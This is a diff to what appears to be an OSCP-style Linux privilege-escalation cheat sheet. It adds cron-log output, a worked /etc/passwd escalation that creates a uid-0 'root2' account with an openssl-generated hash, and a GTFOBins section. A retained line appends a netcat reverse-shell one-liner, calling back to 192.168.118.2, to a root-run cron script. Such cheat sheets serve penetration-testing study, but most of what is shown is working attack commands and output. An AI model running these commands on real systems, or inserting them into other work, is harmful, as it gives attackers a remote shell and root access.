@@ -67,12 +67,13 @@
   * [Enumerating Linux](#Enumerating-Linux)
   * [Exposed Confidential Information](#Exposed-Confidential-Information)
   * [Insecure File Permissions](#Insecure-File-Permissions)
+  * [Insecure System Components](#Insecure-System-Components)
 
 # Tools
 
 - OSCP Tools [https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md](https://github.com/RajChowdhury240/OSCP-CheatSheet/blob/main/Tools.md)
 - The Cyber Swiss Army Knife [https://gchq.github.io/CyberChef/](https://gchq.github.io/CyberChef/)
-- list of Unix binaries for post-exploitation [https://gtfobins.github.io/](https://gtfobins.github.io/)
+- GTFOBins (list of Unix binaries for post-exploitation) [https://gtfobins.github.io/](https://gtfobins.github.io/)
 - Reverse Shell Generator [https://www.revshells.com/](https://www.revshells.com/)
 
 
@@ -1368,7 +1369,13 @@ sudo tcpdump -i lo -A | grep "pass"
 #### Inspecting the cron log file
 
 ~~~ bash
-grep "CRON" /var/log/syslog
+joe@debian-privesc:~$ grep "CRON" /var/log/syslog
+...
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (pidfile fd = 3)
+Aug 25 04:56:07 debian-privesc cron[463]: (CRON) INFO (Running @reboot jobs)
+Aug 25 04:57:01 debian-privesc CRON[918]:  (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:58:01 debian-privesc CRON[1043]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
+Aug 25 04:59:01 debian-privesc CRON[1223]: (root) CMD (/bin/bash /home/joe/.scripts/user_backups.sh)
 ~~~
 
 
@@ -1378,6 +1385,33 @@ grep "CRON" /var/log/syslog
 ~~~ bash
 echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.118.2 1234 >/tmp/f" >> user_backups.sh
 ~~~
+
+
+### Abusing Password Authentication
+
+
+#### Escalating privileges by editing /etc/passwd
+
+~~~ bash
+joe@debian-privesc:~$ openssl passwd w00t
+Fdzt.eqJQ4s0g
+
+joe@debian-privesc:~$ echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd
+
+joe@debian-privesc:~$ su root2
+Password: w00t
+
+root@debian-privesc:/home/joe# id
+uid=0(root) gid=0(root) groups=0(root)
+~~~
+
+
+## Insecure System Components
+
+### Abusing Setuid Binaries and Capabilities
+
+#### GTFOBins (list of Unix binaries for post-exploitation): 
+[https://gtfobins.github.io/](#https://gtfobins.github.io/)
 
 
 
